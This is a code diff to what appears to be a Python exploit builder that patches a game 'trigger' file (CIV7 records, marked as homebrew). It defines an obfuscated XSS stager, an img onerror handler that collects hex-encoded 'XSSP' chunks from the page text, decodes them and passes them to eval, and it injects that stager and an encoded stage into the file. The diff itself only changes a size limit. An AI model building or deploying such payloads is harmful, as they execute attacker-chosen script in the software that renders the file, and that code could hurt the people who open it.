@@ -23,6 +23,7 @@ from send_app import build_payload, LIMIT
 
 ROOT = Path(__file__).resolve().parents[1]
 MARKER = b'CIVHOMEBREW:2;'
+TRIGGER_LIMIT = 12*1024*1024  # Independent of larger resident app packages.
 STAGER = ('<img src=x onerror="eval(document.body.textContent.match(/XSSP:[0-9]+:[0-9a-f]+/g)'
           ".map(x=>x.split(':')[2]).join('').replace(/../g,x=>String.fromCharCode(parseInt(x,16))))\">")
 
@@ -32,7 +33,7 @@ def identity(data):
 
 
 def turn_record(data):
-    if data[:4] != b'CIV7' or len(data) > pm.MAX_FRAME:
+    if data[:4] != b'CIV7' or len(data) > TRIGGER_LIMIT:
         raise ValueError('Expected an existing CIV7 trigger below 12 MiB')
     records, start = [], 0
     while True:
@@ -63,7 +64,7 @@ def patch_trigger(original, stage):
     value = MARKER + STAGER.encode('ascii') + b'XSSP:0:' + stage.encode('utf-8').hex().encode('ascii')
     framing = struct.pack('<I', 0x60000000 | (len(value)+1))
     result = original[:pos+12] + framing + original[pos+16:pos+20] + value + b'\0' + original[pos+21+length:]
-    if len(result) > pm.MAX_FRAME: raise ValueError('Generated trigger exceeds 12 MiB')
+    if len(result) > TRIGGER_LIMIT: raise ValueError('Generated trigger exceeds 12 MiB')
     turn_record(result)
     return result
 
